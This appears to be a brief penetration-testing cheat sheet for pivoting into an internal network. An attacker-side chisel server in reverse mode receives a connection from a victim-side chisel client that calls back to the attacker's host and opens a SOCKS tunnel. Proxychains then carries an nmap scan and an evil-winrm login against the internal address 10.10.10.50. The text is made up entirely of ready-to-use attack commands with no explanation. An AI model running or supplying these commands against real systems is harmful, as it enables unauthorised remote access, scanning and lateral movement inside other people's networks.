```
# Attacker:
./chisel server -p 8888 --reverse

# Victim:
.\chisel.exe client <LHOST>:8888 R:socks
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.50
proxychains evil-winrm -i 10.10.10.50 -u user -p pass
```